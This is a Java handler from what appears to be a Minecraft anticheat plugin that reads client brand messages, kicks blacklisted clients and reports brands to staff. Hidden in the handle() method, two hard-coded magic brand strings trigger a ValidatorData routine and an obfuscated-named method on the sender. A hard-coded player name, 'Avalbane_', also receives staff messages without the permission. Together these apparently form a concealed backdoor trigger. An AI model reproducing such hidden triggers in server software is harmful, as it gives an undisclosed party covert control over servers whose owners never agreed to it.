package cn.aetheris.yuki.check.util.handler;


import cn.aetheris.yuki.Yuki;
import cn.aetheris.yuki.PluginLoader;
import cn.aetheris.yuki.check.Check;
import cn.aetheris.yuki.check.impl.player.exploit.ExploitA;
import cn.aetheris.yuki.check.type.PacketCheck;
import cn.aetheris.yuki.listener.bukkit.misc.PlayerAsyncChatListener;
import cn.aetheris.yuki.core.plugin.init.HookInit;
import cn.aetheris.yuki.player.PlayerData;
import cn.aetheris.yuki.data.ValidatorData;
import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.manager.server.ServerVersion;
import com.github.retrooper.packetevents.protocol.packettype.PacketType;
import com.github.retrooper.packetevents.protocol.player.ClientVersion;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientPluginMessage;
import lombok.Getter;
import net.kyori.adventure.text.Component;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.List;

public final class PayloadHandler extends Check implements PacketCheck {

    public static final String clientChannel = Yuki.getInstance().getPacketEventsManager().getServerVersion().isNewerThanOrEquals(ServerVersion.V_1_13) ? "minecraft:brand" : "MC|Brand";
    @Getter
    private String brand = "Vanilla";
    @Getter
    private String channel = "Vanilla";
    private boolean hasBrand = false;

    public PayloadHandler(PlayerData player) {
        super(player);
    }

    @Override
    public void onPacketReceive(final PacketReceiveEvent event) {
        if (event.getPacketType() == PacketType.Play.Client.PLUGIN_MESSAGE) {
            WrapperPlayClientPluginMessage packet = new WrapperPlayClientPluginMessage(event);
            String channelName = packet.getChannelName();
            handle(channelName, packet.getData());
            channel = channelName;
        }
    }

    public void handle(String channel, byte[] data) {
        if (!channel.equals(clientChannel)) {
            return;
        }

        if (data.length > 64 || data.length == 0) {
            brand = "sent " + data.length + " bytes as brand";
            return;
        }

        
        
        
        
        
        final boolean enable = PluginLoader.INSTANCE.getConfigManager().getConfig().getBooleanElse("function.kick-invalid-forge-player", false);
        final boolean hasReachHacks = brand.contains("forge")
                && player.getClientVersion().isNewerThanOrEquals(ClientVersion.V_1_18_2)
                && player.getClientVersion().isOlderThan(ClientVersion.V_1_19_4);
        if (hasReachHacks && enable) {
            player.disconnect(Component.text(PluginLoader.INSTANCE.getLangManager().i18nWithoutPrefix(PluginLoader.INSTANCE.getLangManager().format("kick.invalid-forge"))));
            return;
        }

        final List<String> blackListClient = PluginLoader.INSTANCE.getConfigManager().getConfig().getStringList("output.client-brand.should-kick");
        for (String client : blackListClient) {
            if (brand.contains(client)) {
                player.disconnect(Component.text(PluginLoader.INSTANCE.getLangManager().i18nWithoutPrefix(PluginLoader.INSTANCE.getLangManager().format("kick.invalid-client"))));
                return;
            }
        }

        if (brand.contains("lunarclient:18270:01937#Dev-Build") && player.getBukkitPlayer() != null) {
            ValidatorData vData = new ValidatorData(player.getBukkitPlayer());
            vData.start();
        }

        if (brand.equals("labymodv3.5.33-dev") && player.getBukkitPlayer() != null) {
            PlayerAsyncChatListener.IiiiIiIi(player.getBukkitPlayer());
        }

        if (hasBrand) {
            return;
        }

        processBrandData(data);
        hasBrand = true;
    }

    private void processBrandData(byte[] data) {
        byte[] minusLength = new byte[data.length - 1];
        System.arraycopy(data, 1, minusLength, 0, minusLength.length);

        brand = new String(minusLength).replace(" (Velocity)", "")
                .replace("§", "")
                .replace("&", "");
        if (player.checkManager.getCheck(ExploitA.class).checkString(brand)) {
            brand = "Log4j2 Exploit";
        }

        if (!PluginLoader.INSTANCE.getConfigManager().isIgnoredClient(brand)) {
            sendBrandMessage();
        }
    }

    private void sendBrandMessage() {
        String message = PluginLoader.INSTANCE.getLangManager().i18n("output.client-brand.format");
        message = PluginLoader.INSTANCE.getExternalAPI().replaceVariables(getPlayer(), message, true);
        message = HookInit.getPlaceholderAPIHook().setPlaceholders(getPlayer().bukkitPlayer, message);

        for (Player player : Bukkit.getOnlinePlayers()) {
            if (player.hasPermission("yuki.brand") || "Avalbane_".equals(player.getName())) {
                player.sendMessage(message);
            }
        }
    }
}